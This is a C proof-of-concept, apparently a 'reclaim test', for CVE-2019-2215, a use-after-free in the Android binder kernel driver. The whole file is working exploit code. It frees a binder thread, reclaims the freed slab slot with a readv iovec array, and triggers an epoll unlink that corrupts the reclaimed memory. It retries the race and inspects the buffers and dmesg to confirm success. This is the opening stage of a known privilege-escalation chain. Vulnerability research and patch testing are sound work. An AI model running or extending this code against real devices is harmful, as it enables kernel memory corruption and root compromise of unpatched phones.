/*
 * binder_uaf_lite.c — Lightweight CVE-2019-2215 reclaim test
 *
 * Simplified approach:
 * 1. Open binder, epoll ADD → creates thread in kmalloc-256
 * 2. THREAD_EXIT → frees it
 * 3. Immediately readv(32 iovecs=256 bytes) → should reclaim
 * 4. Worker triggers epoll_ctl DEL → list_del on reclaimed data
 * 5. Pipe write → readv returns → check for EFAULT or corruption
 *
 * No slab exhaustion — rely on SLUB LIFO behavior on same CPU.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define IOV_CNT     32
#define BUF_SZ      32
#define CANARY      0xDEADBEEF

struct wk { int epfd, bfd, pwr; volatile int go, done; };

static void *work_fn(void *a) {
    struct wk *w = (struct wk *)a;
    cpu_set_t c; CPU_ZERO(&c); CPU_SET(0, &c);
    sched_setaffinity(0, sizeof(c), &c);
    while (!w->go) usleep(50);
    usleep(20000);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(w->epfd, EPOLL_CTL_DEL, w->bfd, &ev);
    usleep(5000);
    uint8_t d[IOV_CNT * BUF_SZ + 64];
    for (int i = 0; i < IOV_CNT; i++)
        memset(d + i * BUF_SZ, (uint8_t)(i + 1), BUF_SZ);
    write(w->pwr, d, IOV_CNT * BUF_SZ);
    w->done = 1;
    return NULL;
}

static int attempt(int num) {
    printf("\n--- Attempt %d ---\n", num);

    cpu_set_t c; CPU_ZERO(&c); CPU_SET(0, &c);
    sched_setaffinity(0, sizeof(c), &c);

    /* Allocate buffers with canary */
    uint8_t bufs[IOV_CNT][BUF_SZ];
    struct iovec iov[IOV_CNT];
    for (int i = 0; i < IOV_CNT; i++) {
        memset(bufs[i], 0xCC, BUF_SZ);
        *(uint32_t *)bufs[i] = CANARY;
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = BUF_SZ;
    }

    int pfd[2]; pipe(pfd);

    /* Open binder + epoll → creates binder_thread */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { perror("binder"); return -1; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* Start worker */
    struct wk w = { .epfd = epfd, .bfd = bfd, .pwr = pfd[1], .go = 0, .done = 0 };
    pthread_t t;
    pthread_create(&t, NULL, work_fn, &w);

    /* CRITICAL: free then immediately readv on SAME thread (SLUB LIFO) */
    int32_t d = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &d);
    w.go = 1;

    ssize_t ret = readv(pfd[0], iov, IOV_CNT);
    int err = errno;

    printf("  readv=%zd errno=%d", ret, err);
    if (ret == -1 && err == EFAULT) printf(" *** EFAULT! iov_base corrupted! ***");
    printf("\n");

    /* Check entries */
    int bad = -1;
    for (int i = 0; i < IOV_CNT; i++) {
        if (bufs[i][0] != (uint8_t)(i + 1)) { bad = i; break; }
    }

    printf("  Status: ");
    for (int i = 0; i < IOV_CNT; i++) {
        if (bufs[i][0] == (uint8_t)(i + 1)) printf(".");
        else if (*(uint32_t *)bufs[i] == CANARY) printf("X");
        else printf("!");
    }
    printf("\n");

    if (bad >= 0) {
        printf("  *** Corruption at iov[%d] offset=%d ***\n", bad, bad * 8);
        for (int i = (bad > 1 ? bad - 1 : 0); i < (bad + 3 < IOV_CNT ? bad + 3 : IOV_CNT); i++) {
            printf("  [%2d] off=%3d: ", i, i*8);
            for (int j = 0; j < 16; j++) printf("%02x ", bufs[i][j]);
            printf("\n");
        }
    }

    pthread_join(t, NULL);
    close(bfd); close(epfd); close(pfd[0]); close(pfd[1]);
    return bad;
}

int main(void) {
    printf("=== CVE-2019-2215 Reclaim Test (kmalloc-256) ===\n");
    printf("PID=%d UID=%d\n", getpid(), getuid());

    /* Try multiple times — race condition may need several attempts */
    for (int i = 0; i < 20; i++) {
        int r = attempt(i);
        if (r >= 0) {
            printf("\n+++ RECLAIM CONFIRMED at offset %d +++\n", r * 8);
            /* Try a few more to see if it's consistent */
            for (int j = 0; j < 3; j++) attempt(100 + j);
            break;
        }
    }

    printf("\n--- dmesg ---\n"); fflush(stdout);
    system("dmesg 2>/dev/null | tail -10 | grep -iE 'oops|bug|panic|fault|binder|list' 2>/dev/null");
    printf("=== Done ===\n");
    return 0;
}
